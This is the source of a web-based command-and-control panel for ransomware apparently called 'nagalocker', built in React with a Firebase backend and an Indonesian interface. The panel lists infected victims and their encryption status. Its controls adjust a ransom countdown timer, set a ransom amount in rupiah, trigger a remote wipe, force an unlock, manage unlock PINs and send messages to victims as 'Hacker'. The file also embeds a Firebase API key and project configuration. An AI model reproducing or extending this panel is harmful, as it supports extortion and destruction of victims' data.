<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARCHITECT C2 - Cluster Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background-color: #020617; color: #cbd5e1; }
        .font-orbit { font-family: 'Orbitron', sans-serif; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.3); }
        .scrollbar-hide::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
            authDomain: "nagalocker.firebaseapp.com",
            projectId: "nagalocker",
            storageBucket: "nagalocker.firebasestorage.app",
            messagingSenderId: "529236383091",
            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
            measurementId: "G-S98ECJN5LY"
        };

        window.FirebaseLib = {
            app: initializeApp(firebaseConfig),
            getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query,
            getAuth, signInAnonymously
        };
        window.dispatchEvent(new Event('firebase-ready'));
    </script>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function App() {
            const [fbReady, setFbReady] = useState(false);
            const [victims, setVictims] = useState([]);
            const [activeId, setActiveId] = useState(null);
            const [activeData, setActiveData] = useState(null);
            const [input, setInput] = useState('');
            const [newPin, setNewPin] = useState('');

            useEffect(() => {
                const handleReady = () => setFbReady(true);
                if (window.FirebaseLib) handleReady();
                else window.addEventListener('firebase-ready', handleReady);
            }, []);

            useEffect(() => {
                if (!fbReady) return;
                const { getAuth, signInAnonymously, getFirestore, collection, onSnapshot } = window.FirebaseLib;
                signInAnonymously(getAuth());
                
                const colRef = collection(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims");
                return onSnapshot(colRef, (snap) => setVictims(snap.docs.map(d => d.data())));
            }, [fbReady]);

            useEffect(() => {
                if (!activeId || !fbReady) return;
                const { getFirestore, doc, onSnapshot } = window.FirebaseLib;
                return onSnapshot(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeId), (s) => setActiveData(s.data()));
            }, [activeId, fbReady]);

            const updateField = async (field, value) => {
                if (!activeId) return;
                const { getFirestore, doc, updateDoc } = window.FirebaseLib;
                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeId), { [field]: value });
            };

            const addPin = async () => {
                if (!newPin.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeId), { validPins: arrayUnion(newPin) });
                setNewPin('');
            };

            const sendMsg = async () => {
                if (!input.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeId), {
                    messages: arrayUnion({ sender: 'Hacker', text: input, time: Date.now() })
                });
                setInput('');
            };

            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING CLUSTER...</div>;

            return (
                <div className="min-h-screen flex flex-col lg:flex-row">
                    <aside className="w-full lg:w-80 bg-slate-900 border-r border-slate-800 p-6 overflow-y-auto">
                        <div className="flex items-center gap-3 mb-10">
                            <div className="bg-red-600 p-2 rounded-xl shadow-lg"><i data-lucide="shield-alert" className="text-white w-6 h-6"></i></div>
                            <h1 className="text-xl font-black italic font-orbit uppercase">C2 CLUSTER</h1>
                        </div>
                        <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-4 px-2">Victims ({victims.length})</h2>
                        <div className="space-y-2">
                            {victims.map((v) => (
                                <button key={v.id} onClick={() => setActiveId(v.id)} className={`w-full p-4 rounded-xl flex items-center justify-between transition-all ${activeId === v.id ? 'bg-red-600 text-white' : 'bg-black/40 text-slate-400 hover:bg-slate-800'}`}>
                                    <div className="text-left"><p className="text-xs font-black font-mono">{v.id}</p><p className="text-[8px] uppercase">{v.isLocked ? 'Encrypted' : 'Decrypted'}</p></div>
                                    <div className={`w-2 h-2 rounded-full ${Date.now() - v.lastSeen < 30000 ? 'bg-green-500 animate-pulse' : 'bg-slate-700'}`}></div>
                                </button>
                            ))}
                        </div>
                    </aside>

                    <main className="flex-1 p-4 lg:p-10 bg-black overflow-y-auto">
                        {!activeId ? (
                            <div className="h-full flex flex-col items-center justify-center text-slate-700 font-black uppercase italic tracking-widest">PILIH TARGET UNTUK KENDALI</div>
                        ) : activeData && (
                            <div className="space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-500">
                                <header className="glass p-6 rounded-3xl border border-slate-800 flex justify-between items-center shadow-2xl">
                                    <div><h2 className="text-2xl font-black text-white italic font-orbit uppercase">TARGET: {activeId}</h2><p className="text-[10px] text-slate-500 font-black">Sync: <span className="text-green-500 font-bold uppercase">STABLE</span></p></div>
                                    <div className="text-right"><p className="text-[10px] text-slate-500 font-bold uppercase">STATUS</p><p className={`text-xs font-black font-orbit ${activeData.isLocked ? 'text-red-500' : 'text-green-500'}`}>{activeData.isLocked ? 'ENCRYPTED' : 'DECRYPTED'}</p></div>
                                </header>

                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                                    <div className="space-y-6">
                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8">Remote Actions</h3>
                                            <div className="grid grid-cols-2 gap-6 mb-8">
                                                <div className="bg-black/40 p-4 rounded-3xl border border-slate-800">
                                                    <p className="text-[9px] text-slate-500 mb-2 font-black">Timer (m)</p>
                                                    <div className="flex items-center justify-between"><span className="text-xl font-bold text-red-500">{Math.floor(activeData.timeLeft/60)}m</span><div className="flex gap-1"><button onClick={() => updateField('timeLeft', Math.max(0, activeData.timeLeft - 300))} className="p-1.5 bg-slate-800 rounded-lg text-xs">-</button><button onClick={() => updateField('timeLeft', activeData.timeLeft + 300)} className="p-1.5 bg-slate-800 rounded-lg text-xs">+</button></div></div>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-3xl border border-slate-800">
                                                    <p className="text-[9px] text-slate-500 mb-2 font-black">Ransom (IDR)</p>
                                                    <input className="bg-transparent border-b border-slate-700 w-full text-lg font-bold text-white outline-none focus:border-red-600" value={activeData.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
                                                </div>
                                            </div>
                                            <div className="grid grid-cols-2 gap-4">
                                                <button onClick={() => updateField('isWiping', !activeData.isWiping)} className={`py-4 rounded-2xl font-black text-xs transition-all ${activeData.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500'}`}>WIPE TARGET</button>
                                                <button onClick={() => updateField('isLocked', !activeData.isLocked)} className={`py-4 rounded-2xl font-black text-xs transition-all ${activeData.isLocked ? 'bg-slate-800 text-green-500' : 'bg-green-600 text-black'}`}>FORCE UNLOCK</button>
                                            </div>
                                        </section>

                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Target Key Database</h3>
                                            <div className="flex gap-2 mb-6">
                                                <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="New Pin..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
                                                <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase">ADD</button>
                                            </div>
                                            <div className="flex flex-wrap gap-2 max-h-32 overflow-y-auto scrollbar-hide px-1">
                                                {activeData.validPins && activeData.validPins.map((p, i) => (
                                                    <div key={i} className="bg-slate-800 px-4 py-2 rounded-lg text-xs font-black text-green-500 font-mono border border-slate-700">{p}</div>
                                                ))}
                                            </div>
                                        </section>
                                    </div>

                                    <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[550px] shadow-2xl">
                                        <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 p-2 flex items-center gap-2"><i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Intercept Log</h3>
                                        <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
                                            {activeData.messages && activeData.messages.map((m, i) => (
                                                <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
                                                    <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>{m.text}</div>
                                                </div>
                                            ))}
                                        </div>
                                        <div className="flex gap-2">
                                            <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Transmit message..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all" />
                                            <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl active:scale-95 transition-all"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </main>
                </div>
            );
        }
        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
        setInterval(() => window.lucide && lucide.createIcons(), 1000);
    </script>
</body>
</html>
